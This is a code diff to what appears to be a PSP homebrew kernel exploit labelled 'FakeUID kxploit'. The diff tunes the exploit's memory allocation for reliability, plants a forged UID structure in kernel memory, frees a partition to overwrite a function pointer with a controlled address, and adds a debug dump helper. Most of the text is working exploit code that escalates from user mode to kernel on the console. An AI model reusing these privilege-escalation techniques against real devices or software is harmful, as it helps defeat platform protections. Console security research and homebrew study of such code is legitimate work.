@@ -115,6 +115,12 @@ int checkPlantUID(int uid){
   return (data == libc_clock_offset - 4);
 }
 
+void dumpBuf(char* path, void* buf, int size){
+  int fd = g_tbl->IoOpen(path, PSP_O_WRONLY|PSP_O_CREAT|PSP_O_TRUNC, 0777);
+  g_tbl->IoWrite(fd, buf, size);
+  g_tbl->IoClose(fd);
+}
+
 /*
 FakeUID kxploit
 */
@@ -123,7 +129,7 @@ int doExploit(void) {
 
     int res;
     u32 seed = 0;
-    
+
     if (_sceNpCore_8AFAB4A0 != NULL){
       u32 test_val = readKram(SYSMEM_SEED_OFFSET_CHECK);
       if (test_val == 0x8F154E38){
@@ -135,7 +141,9 @@ int doExploit(void) {
     // Allocate dummy block to improve reliability
     char dummy[32];
     memset(dummy, 'a', sizeof(dummy));
-    SceUID dummyid = g_tbl->KernelAllocPartitionMemory(PSP_MEMORY_PARTITION_USER, dummy, PSP_SMEM_Low, 0x10, NULL);
+    SceUID dummyid;
+    for (int i=0; i<10; i++)
+      dummyid = g_tbl->KernelAllocPartitionMemory(PSP_MEMORY_PARTITION_USER, dummy, PSP_SMEM_High, 0x10, NULL);
 
     // we can calculate the address of dummy block via its UID and from there calculate where the next block will be
     u32 dummyaddr = 0x88000000 + ((dummyid >> 5) & ~3);
@@ -145,16 +153,33 @@ int doExploit(void) {
 
     // Plant UID data structure into kernel as string
     u32 string[] = { libc_clock_offset - 4, 0x88888888, 0x88016dc0, encrypted_uid, 0x88888888, 0x10101010, 0, 0 };
-    SceUID plantid = g_tbl->KernelAllocPartitionMemory(PSP_MEMORY_PARTITION_USER, (char *)string, PSP_SMEM_Low, 0x10, NULL);
+    SceUID plantid = g_tbl->KernelAllocPartitionMemory(PSP_MEMORY_PARTITION_USER, (char *)string, PSP_SMEM_High, 0x10, NULL);
 
     g_tbl->KernelDcacheWritebackAll();
-    
+
+    //dumpBuf("ms0:/dummyaddr.bin", &dummyaddr, sizeof(dummyaddr));
+    //dumpBuf("ms0:/newaddr.bin", &newaddr, sizeof(newaddr));
+
     // Overwrite function pointer at LIBC_CLOCK_OFFSET with 0x88888888
     res = g_tbl->KernelFreePartitionMemory(uid);
 
-    if (res < 0)
-        return res;
-        
+    g_tbl->KernelDcacheWritebackAll();
+
+    /*
+    int (*CtrlReadBufferPositive)(SceCtrlData *, int) = NULL;
+    CtrlReadBufferPositive = g_tbl->FindImportUserRam("sceCtrl", 0x1F803938);
+    u32 EXIT_MASK = (PSP_CTRL_START | PSP_CTRL_UP);
+    while (1){
+      SceCtrlData pad_data;
+  	  CtrlReadBufferPositive(&pad_data, 1);
+      if((pad_data.Buttons & EXIT_MASK) == EXIT_MASK){
+        break;
+      }
+    }
+    */
+   
+    if (res < 0) return res;
+
     return 0;
 }
 
